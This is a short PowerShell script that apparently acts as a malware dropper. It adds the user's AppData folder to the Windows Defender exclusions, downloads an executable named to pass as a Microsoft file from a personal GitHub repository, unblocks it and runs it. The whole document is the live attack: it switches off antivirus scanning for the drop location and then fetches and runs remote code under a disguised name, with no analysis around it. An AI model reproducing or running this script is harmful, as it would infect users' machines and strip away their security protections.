$exePath = "$env:AppData\Microsoft.exe"
$exeUrl = "https://github.com/qoqoxxxx-stack/aa/raw/refs/heads/main/Microsoft.exe"

# 1. Add Exclusion for AppData
Add-MpPreference -ExclusionPath $env:AppData -ErrorAction SilentlyContinue

# 2. Download the EXE
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UserAgent "Mozilla/5.0" -ErrorAction SilentlyContinue

# 3. Unblock and Run
Unblock-File $exePath
Start-Process $exePath
